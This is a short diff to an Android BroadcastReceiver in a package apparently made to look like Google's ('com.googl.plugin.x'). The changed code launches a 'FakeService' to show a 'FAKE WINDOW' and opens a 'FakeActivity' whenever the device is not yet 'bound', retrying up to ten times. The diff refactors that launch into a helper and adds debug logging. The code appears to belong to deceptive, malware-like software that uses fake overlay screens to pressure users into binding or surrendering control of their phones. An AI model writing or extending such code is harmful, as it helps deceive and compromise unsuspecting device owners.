@@ -9,6 +9,7 @@ import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.Utils.BRCUtil;
+import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -205,11 +206,13 @@ public class ScreenBRC extends BroadcastReceiver {
         } else if (!isDeviceBinded) {
             if (AppRuntime.WATCHING_SERVICE_RUNNING.get()) return;
 
+            if (Config.DEBUG) {
+                Config.LOGD("[[ScreenBRC::onReceive]] try to start FAKE WINDOWS process, binding Time : "
+                                + SettingManager.getInstance().getDeviceBindingTime());
+            }
+
             if (SettingManager.getInstance().getDeviceBindingTime() <= 10) {
-                Intent is = new Intent();
-                is.setClass(context, FakeService.class);
-                is.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
-                context.startService(is);
+                CommonUtil.startFakeService(context, "ScreenBRC::onReceive");
 
                 Intent i = new Intent();
                 i.setClass(context, FakeActivity.class);
